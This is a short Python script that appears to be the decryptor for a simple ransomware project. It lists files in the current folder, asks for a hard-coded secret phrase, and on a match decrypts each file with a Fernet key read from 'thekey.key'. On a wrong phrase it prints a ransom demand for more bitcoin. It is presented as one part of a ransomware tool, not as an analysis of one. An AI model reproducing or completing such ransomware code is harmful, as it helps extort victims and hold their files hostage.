import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "main.py" or file == "thekey.key" or file == "Graphiques.py" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)
print(files)

secretphrase = "coffee"

user_input = input("enter the secret phrase\n")
if user_input == secretphrase:

    with open("thekey.key", "rb")as key:
        secretkey = key.read()
    for file in files:
        with open(file, "rb")as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("congrats all your files has been decrypted")
else:
    print("sorry you're wrong send me more bitcoin")